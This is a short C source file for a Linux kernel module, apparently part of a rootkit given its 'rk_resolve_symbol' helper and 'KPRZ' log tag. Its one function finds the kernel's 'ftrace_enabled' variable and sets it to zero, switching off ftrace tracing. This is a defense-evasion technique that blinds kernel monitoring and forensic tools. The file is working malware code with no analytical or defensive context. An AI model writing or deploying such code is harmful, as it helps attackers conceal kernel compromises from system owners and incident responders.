#include "memory_utils.h"
#include "trace_disabler.h"
#include <linux/kallsyms.h>
#include <linux/kernel.h>

void disable_ftrace_tracing(void) {
    unsigned long *ftrace_enabled_ptr = (unsigned long *)rk_resolve_symbol("ftrace_enabled");
    if (ftrace_enabled_ptr) {
        *ftrace_enabled_ptr = 0;
        printk(KERN_INFO "KPRZ: Ftrace / Tracing disabled via ftrace_enabled patch.\n");
    }
}
